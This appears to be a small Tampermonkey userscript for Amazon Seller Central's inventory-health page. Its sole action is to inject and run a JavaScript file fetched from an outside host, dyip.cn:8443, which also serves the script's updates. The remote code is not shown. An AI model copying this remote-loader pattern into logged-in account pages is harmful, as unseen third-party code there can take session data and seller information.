// ==UserScript==
// @name         fba fee
// @namespace    http://tampermonkey.net/
// @version      0.2
// @description  try to take over the world!
// @author       You
// @match        https://sellercentral.amazon.com/inventoryplanning/manageinventoryhealth*
// @icon         https://www.google.com/s2/favicons?domain=amazon.com
// @updateURL    https://dyip.cn:8443/userscripts/template.user.js
// @downloadURL    https://dyip.cn:8443/userscripts/template.user.js
// @grant        none
// ==/UserScript==


const el = document.createElement('script')
el.setAttribute('src', 'https://dyip.cn:8443/scripts/fbafee.js')

document.body.append(el)
